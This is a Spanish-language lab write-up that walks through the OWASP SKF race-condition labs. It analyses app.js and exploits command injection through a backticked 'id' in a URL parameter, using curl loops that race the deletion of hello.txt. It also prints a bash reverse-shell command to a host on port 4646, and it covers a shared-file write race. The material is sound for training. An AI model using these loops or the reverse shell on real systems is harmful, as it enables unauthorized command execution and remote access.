---
title: "[Lab] Race Condition"
date: 2023-12-25
categories: [OWASPTop10]
tags: [owasptop10, hacking, race condition]
---

# Condiciones de carrera (Race Condition)


## Instalación

```bash
git clone https://github.com/blabla1337/skf-labs

# Lab RaceCondition
cd skf-labs/nodeJs/RaceCondition
npm install
npm start

# Lab RaceCondition-file-write
cd skf-labs/nodeJs/RaceCondition-file-write
npm install
npm start

# Si el "npm install" no funciona, agregar 
# un --force al final
```

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled.png)

La web lo que hace es tomar un nombre que ingrese el usuario y el usuario envía esta información por el método GET con los siguientes datos: “/?person=bryan&action=validate” y después de de enviar la petición, se pide al usuario “Bootea” el sistema, entonces el usuario ahora envía la siguiente petición por GET: “/?action=run”

## Análisis de código

Se analizará el archivo “app.js”:

De primeras, cuando el usuario ingresa un nombre, envía una petición por GET con los siguientes datos: “/?person=bryan&action=validate”, en este caso se está estableciendo el parámetro de “action” en “validate”.

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%201.png)

Esto a nivel de código lo que hace es entrar en la siguiente función la cual crea una variable “person” y almacena lo que envía el usuario en el parámetro “person” y en el caso que no se haya ingresado nada, se pone por default “Default User”. Luego crea otra variable “valid”, esta almacena el valor de la función “boot_validate(person)”, esta función toma como argumento el valor de “person”.

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%202.png)

La función “boot_validate(person)” primero escribe en el archivo “hello.sh” un comando el cual es un echo del valor de la variable “person” y el resultado lo almacena en el archivo “hello.txt”, ese comando es escrito literalmente dentro del archivo “hello.sh” sin ser ejecutado, luego se crean unos archivos logs y después de eso se ejecuta el archivo “hello.sh” esto creará el archivo “hello.txt con lo ingresado por el usuario”, ahora se ejecuta la función “valid()” la cual retornará el valor de “execSync” el cual hace una validación de la cadena almacenada en el archivo “hello.sh” usando una expresión regular, es decir, verifica que la cadena ingresada empiece y acabe con caracteres de la A a la Z en minúscula y mayúscula y/o que contenga números, de lo contrario, retornará una cadena vacía, por último el valor retornado será ahora el valor de la función “valid()” para luego ser retornado el valor de la función “valid()” a la función “boot_validate(person)” y este valor será almacenado en la variable “valid” de la condicional mostrada en la imagen anterior.

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%203.png)

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%204.png)

Una vez creadas las dos variables “person” y “valid” , se ejecutará la función “boot_run()” el cual ejecuta el archivo “hello.sh”, luego se creará una variable “hello” que almacenará el contenido del archivo “hello.txt”, posterior a ello, se hará un renderizado de la página web con “res.render”, esto leerá el archivo “index.ejs” y la variable “hello”, esta variable “hello” es la que hace que en la web se muestre el nombre del usuario.

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%205.png)

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%206.png)

Ahora qué pasa si en lugar de un nombre, el usuario intenta ingresar un comando, por ejemplo “**``id``**”:

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%207.png)

Muestra ese mensaje porque cuando se hace la validación de la cadena, como no es una cadena válida porque contiene comillas “``", retorna una cadena vacía y recordando la condicional, si la variable “valid” es una cadena vacía, se ejecuta la función “boot_clean()” la cual elimina el archivo “hello.txt”

![Ejemplo de la ejecución de la expresión regular en el código](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%208.png)

Ejemplo de la ejecución de la expresión regular en el código

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%209.png)

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%2010.png)

Al eliminar este archivo, cuando el flujo del programa continúe, y la variable “hello” intente leer el archivo “hello.txt” dará un error ya que no existe, por lo que entrará en el “catch (error)” y “hello” almacenará como valor la cadena mostrada anteriormente.

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%2011.png)

Hay que recordar que cuando se ejecute el archivo “hello.sh”, se hará un echo de lo que ingresó el usuario y el resultado del comando lo almacenará en “hello.txt”, por ejemplo “**`echo `id` > hello.txt`**" pero como tiene caracteres inválidos, lo eliminará y mostrará el mensaje de error.

![Ejemplo de resultado de comando al ejecutar el archivo “hello.sh”](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%2012.png)

Ejemplo de resultado de comando al ejecutar el archivo “hello.sh”

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%2013.png)

Al atacante le interesa leer el archivo “hello.txt” ya que contiene el resultado del comando “id” y aunque este es eliminado, hay un pequeño instante en el que el archivo existe antes de ser validado, y aquí es donde entran las **Race Condition**.

## Race Condition - Ejemplo

Para mostrar un ejemplo de esto, se creará un bucle infinito que leerá el archivo “hello.txt”, como se sabe, este archivo será eliminado cuando se intente ingresar un comando como “**``id``**" pero habrá un momento en el que este archivo exista por lo que este comando capturará repetidamente el resultado del comando de forma que podrá mostrar el resultado del comando cuando exista:

```bash
while true; do cat hello.txt; done
```

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%2014.png)

Como se puede ver, se captura el resultado del comando antes que este sea eliminado.

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%2015.png)

## Race Condition

El ejemplo anterior se muestra cómo se aprovecha esta vulnerabilidad pero de forma local con los archivos del servidor, más que nada de manera ilustrativa. Ahora se mostrará la misma idea pero tomando en cuenta que el atacante no tiene acceso a estos archivos internos del servidor:

Se creará un bucle infinito en el que se hace un curl a la página principal filtrando por la cadena de “Check this out” ya que en este campo se muestra lo que se encuentra en el archivo “hello.txt” y por otro lado, se creará otro bucle infinito en paralelo que hará constantemente peticiones con curl enviando los datos “person” y “validate”, en este caso como valor de “person”, se insertará el comando “**``id``**” y la idea será la misma, intentar ver el resultado del comando ejecutado, en el archivo "hello.txt".

```bash
# Primer bucle
while true; do curl -s X GET 
'http://localhost:5000/?action=run' | grep "Check this out" 
| html2text | xargs | 
grep -vE "Default User|Important|bryan"; done

# Segundo bucle
while true; do curl -s -X GET 
'http://localhost:5000/?person=`id`&action=validate'; 
done &>/dev/null
```

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%2016.png)

Aunque la idea de este lab es aplicar un Race Condition, se podría ejecutar un comando para mandar una shell interactiva al atacante:

```bash
bash -c "bash -i >& /dev/tcp/192.168.0.108/4646 0>&1"
bash -c 'bash -i >& /dev/tcp/192.168.0.108/4646 0>&1'
```

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%2017.png)

## Race Condition - File Write

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%2018.png)

Esta página web consiste en que se puede crear un archivo y su contenido será lo que el usuario ingrese en la URL, al enviar la petición abrirá una ventana para descargar el archivo, el archivo en este caso siempre se llamará igual (”shared-file.txt”).

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%2019.png)

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%2020.png)

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%2021.png)

A nivel de código primero toma el valor que se ingresó en el parámetro de la URL y se almacena en “value”, luego se escribe en el archivo “shared-file.txt”, el valor de “value” y el resto se encarga de mostrar la ventana de descarga en pantalla.

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%2022.png)

Aquí hay un pequeño margen entre que se crea el archivo y cuando se la ventana para descargarlo y esto puede derivarse a un Race Condition, por ejemplo, si múltiples usuarios están escribiendo y almacenando contenido en el archivo shared-file.txt puede ser que dos o varios usuarios en simultaneo escriban en el 

archivo y a la hora de mostrar el contenido, se vea el de otra persona.

Por ejemplo, se simularán dos usuarios, uno será desde la máquina local y el otro desde Burpsuite:

El usuario que opera desde la máquina local está ejecutando en bucle infinito, un comando con curl para crear un archivo:

```bash
while true; do curl -s -X GET "http:localhost:5000/hola" | 
grep -v "hola"; done
```

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%2023.png)

Y por otro lado, hay otro usuario que también está escribiendo contenido en el archivo:

![Untitled](Condiciones%20de%20carrera%20(Race%20Condition)%2084878b96e88941f8b828e1ae947a2d18/Untitled%2024.png)

Debido a que ambos están escribiendo al mismo tiempo y están operando en el mismo archivo, por el pequeño margen que hay entre que se escribe el archivo y se muestra la ventana para descargarlo, puede ser que se sobrescriban entre ellos y se de el Race Condition
